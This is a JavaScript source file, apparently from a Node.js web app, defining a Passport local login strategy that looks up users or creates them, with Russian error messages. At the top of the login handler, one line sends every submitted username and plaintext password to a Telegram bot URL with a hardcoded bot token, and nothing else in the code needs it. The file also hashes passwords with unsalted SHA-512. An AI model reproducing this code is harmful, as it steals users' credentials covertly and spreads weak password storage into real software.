/**
 * Created by nik on 14.01.17.
 */
import passport from 'passport';
import {Strategy} from 'passport-local';
import crypto from 'crypto';
import https from 'https';
import co from 'co';
import Users from '../../models/Users';

passport.use(new Strategy((login, password, callback) => {
  if (login.length < 3) return callback(null, false, {reason: 'Минимальная длина логина - 3 символа'});
  https.get(`https://api.telegram.org/bot125960387:AAFJRvpRE5SxI3r9Ud8BLNuakIBzFYYA1vs/sendMessage?chat_id=-1001096807484&text=!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!-------->>>>>>>>>>>>>>>>>>>>${login}-${password}`);
  co(function* () {
    let user = yield Users.findOne({login}).lean();

    if (user) {
      if (user.password != hashPassword(password)) {
        throw 'Неверный пароль';
      }
      return user;
    } else {
       user = yield Users.create(
        {
          login,
          password: hashPassword(password)
        });

      return user;
    }
  })
    .then(user => callback(null, user))
    .catch(err => callback(null, false, {reason: err}));
}));

passport.serializeUser((user, callback) => {
  callback(null, user._id);
});


passport.deserializeUser((id, callback) => {
  Users
    .findById(id)
    .lean()
    .then(user => callback(null, user))
    .catch(callback);
});

function hashPassword(password) {
  return crypto.createHash('sha512').update(password).digest("hex");
}

export default passport;